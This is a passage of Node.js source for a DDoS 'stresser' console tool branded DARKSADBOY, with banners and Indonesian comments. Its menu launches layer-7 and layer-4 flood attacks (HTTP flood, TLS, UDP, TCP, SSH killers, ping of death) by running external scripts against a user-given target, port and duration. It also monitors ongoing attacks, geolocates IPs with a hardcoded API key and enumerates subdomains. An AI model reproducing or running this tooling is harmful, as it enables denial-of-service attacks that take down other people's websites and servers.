⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑲𝑰𝑳𝑳 𝑷𝑰𝑵𝑮 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/killpingnew`);
exec(`node ${metode} ${target} 65507 6 1 ${duration}`)
sigma()
};
async function tcpbaru(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Tcp <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑷𝒐𝒓𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Tcp 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : TCP 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/tcpnew`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function GoodBye(args) {
console.log(`𝑮𝒐𝒐𝒅𝑩𝒚𝒆 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔!!`)
process.exit(0);
}
// [========================================] //
async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung🕊️🪽.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== 𝑶𝒏𝒈𝒐𝒊𝒏𝒈 𝑨𝒕𝒕𝒂𝒄𝒌𝒔 🕊🪽===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\n𝑶𝒏𝒈𝒐𝒊𝒏𝒈 𝑨𝒕𝒕𝒂𝒄𝒌🕊️🪽:\n");
  processList.forEach((process) => {
console.log(`𝑫𝒐𝒎𝒂𝒊𝒏🕊️🪽: ${process.target}
𝑴𝒆𝒕𝒉𝒐𝒅𝒔🕊️🪽: ${process.methods}
𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏🕊️🪽: ${process.duration} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔
𝑺𝒊𝒏𝒄𝒆🕊️🪽: ${Math.floor((Date.now() - process.startTime) / 1000)} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔 𝑨𝒈𝒐\n`);
  });
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: track-ip <𝑰𝑷 𝑨𝒅𝒅𝒓𝒆𝒔𝒔 𝑻𝒂𝒓𝒈𝒆𝒕>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`𝑱𝒂𝒏𝒈𝒂𝒏 𝑫𝒊 𝑼𝒍𝒂𝒏𝒈𝒊 𝑲𝒂𝒌 𝑵𝒂𝒏𝒕𝒊 𝑫𝒊 𝑫𝒆𝒍𝒆𝒕𝒆 𝑼𝒔𝒆𝒓 𝑴𝒖🕊️🪽`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.log(`
 - 𝑭𝒍𝒂𝒈: ${ipInfo.country_flag}
 - 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: ${ipInfo.country_name}
 - 𝑪𝒂𝒑𝒊𝒕𝒂𝒍: ${ipInfo.country_capital}
 - 𝑪𝒊𝒕𝒚: ${ipInfo.city}
 - 𝑰𝑺𝑷: ${ipInfo.isp}
 - 𝑶𝒓𝒈𝒂𝒏𝒊𝒛𝒂𝒕𝒊𝒐𝒏: ${ipInfo.organization}
 - 𝑳𝒂𝒕: ${ipInfo.latitude}
 - 𝑳𝒐𝒏𝒈: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}\x1b[0m
 𝑻𝒚𝒑𝒆 [\x1b[1m\x1b[35m𝑪𝒍𝒔\x1b[0m] 𝑻𝒐 𝑪𝒍𝒆𝒂𝒓 𝑻𝒆𝒓𝒎𝒊𝒏𝒂𝒍 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}🕊️🪽`)
      sigma()
    }
    }
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: .subdo-finder <𝑫𝒐𝒎𝒂𝒊𝒏 𝑻𝒂𝒓𝒈𝒆𝒕>
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.log(`
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊🪽`)
  sigma()
}
sigma()
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
𝑪𝒓𝒆𝒂𝒕𝒆𝒅 𝑨𝒏𝒅 𝑪𝒐𝒅𝒆𝒅 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔 𝑭𝒖𝒍𝒍 𝑩𝒚 𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐:
Tuhan ( Maha Pencipta )
Orang Tua ( Yang Melahirkan Saya )
ChatGPT ( Fixing Error Code )
STEVENSTORE-C2 NOT SEPUH ( Developer DARKSADBOY )
My Girls ( Yang Sudah Banyak Support Saya, Dll )
My Friend ( Yang Sudah Banyak Membantu Saya )
My Team ( Yang sudah Banyak Memberikan Ilmu dan Membantu Saya )
PLN Dan Wifi ( Sebagai Alat Internet Dan Penyedia Listrik )
YouTube ( Music Yang Menemani Saya )
My Subscriber ( Yang Udah Bantu Channel Saya)
`
permen.question(`${back_putih}${teksungu}𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔${Reset}➔ ${back_putih}${teksungu}𝑪𝒐𝒏𝒔𝒐𝒍𝒆${Reset}: \n`, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
\x1b[38;2;173;150;255m 
                          ╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔╗╔╦ ╦
                          ╠═╣║╣ ║  ╠═╝  ║║║║╣ ║║║║ ║
                          ╩ ╩╚═╝╩═╝╩    ╩ ╩╚═╝╝╚╝╚═╝.         \x1b[0m
[=========================================]  
|| 𝑴𝒆𝒕𝒉𝒐𝒅𝒔
|| 𝑻𝒖𝒕𝒐𝒓𝒊𝒂𝒍
|| 𝑺𝒄𝒓𝒂𝒑𝒆
|| 𝑴𝒐𝒏𝒊𝒕𝒐𝒓
|| 𝑶𝒏𝒈𝒐𝒊𝒏𝒈
|| 𝑺𝒖𝒃𝒅𝒐-𝑭𝒊𝒏𝒅𝒆𝒓
|| 𝑻𝒓𝒂𝒄𝒌-𝑰𝑷   
|| 𝑪𝒓𝒆𝒅𝒊𝒕𝒔
|| 𝑪𝒍𝒔
|| 𝑬𝒙𝒊𝒕/𝑶𝒖𝒕    
[=========================================]
`);
    sigma();
          } else if (command === 'methods') {
    console.log(`
🟢 | 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽  | 𝑽𝒊𝒑:  𝑻𝒓𝒖𝒆  | 𝑺𝒖𝒑𝒆𝒓𝑽𝑰𝑷:  𝑻𝒓𝒖𝒆 
\x1b[38;2;173;150;255m     
         ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
         ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
         ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m

──────────────────────[ 𝑻𝑼𝑻𝑶𝑹𝑰𝑨𝑳 𝑨𝑻𝑻𝑨𝑪𝑲 𝑳7&𝑳4 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔 ]──────────────────────
   • 𝑴𝑬𝑻𝑯𝑶𝑫𝑺 𝑻𝑨𝑹𝑮𝑬𝑻 𝑷𝑶𝑹𝑻 𝑻𝑰𝑴𝑬
───────────────────────[𝑨𝑳𝑳 𝑰𝑵 𝑳7&𝑳4 𝑴𝑬𝑻𝑯𝑶𝑫𝑺 𝑨𝑻𝑻𝑨𝑪𝑲]───────────────────────
 ► [ 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 𝑳𝒂𝒚𝒆𝒓 7 𝑾𝒆𝒃𝒔𝒊𝒕𝒆 ]
     - FLOOD
     - YUNI
     - H2-DARK
     - TLS
     - STEVEN
     - DARKSADBOY
 ► [ 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 𝑳𝒂𝒚𝒆𝒓 4 𝑰𝑷 ]
     - UDP
     - TCP
     - KILLSSH
     - KILLDO
     - OVH
     - TCP-PPS
     - TICIPI
     - PING
────────────────────────────────────────────────────────────
`);
    sigma();
    } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
   } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
    } else if (command === 'scrape') {
    exec('node ./tools/scrape.js', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    
    sigma();
    } else if (command === 'flood') {
    flood(args)
    } else if (command === 'h2-dark') {
    h2dark(args)
    } else if (command === 'yuni') {
    yuni(args)
    } else if (command === 'tls') {
    tls(args)
    } else if (command === 'darksadboy') {
    darksadboy(args)
    } else if (command === 'killssh') {
    killSSH(args);
    } else if (command === 'killdo') {
    killDo(args);
    } else if (command === 'udp') {
    udp_flood(args);
    } else if (command === 'tcp') {
    tcp_flood(args);
    } else if (command === 'ovh') {
    ovh(args)
    } else if (command === 'tcp-pps') {
    tcppps(args)
    } else if (command === 'ticipi') {
    ticipi(args)
    } else if (command === 'ping') {
    pod(args)
    } else if (command === 'tcpnew') {
    tcpbaru(args)
    } else if (command === 'steven') {
    steven(args)
    } else if (command === 'tutorial') {
  	console.log(`
 𝑻𝒖𝒕𝒐𝒓𝒊𝒂𝒍 𝑴𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 𝑻𝒂𝒓𝒈𝒆𝒕 𝑷𝒐𝒓𝒕 𝑻𝒊𝒎𝒆
 𝑪𝒐𝒏𝒕𝒐𝒉 => Flood https://website.com 443 60`);
    sigma();
    } else if (command === 'monitor') {
    monitorOngoingAttacks()
    sigma()
    } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
    } else if (command === 'track-ip') {
    trackIP(args);
    } else if (command === 'subdo-finder') {
    subdomen(args)
    } else if (command === 'exit') {
    GoodBye(args);
    sigma();
    } else if (command === 'out') {
    GoodBye(args);
    sigma();
    } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()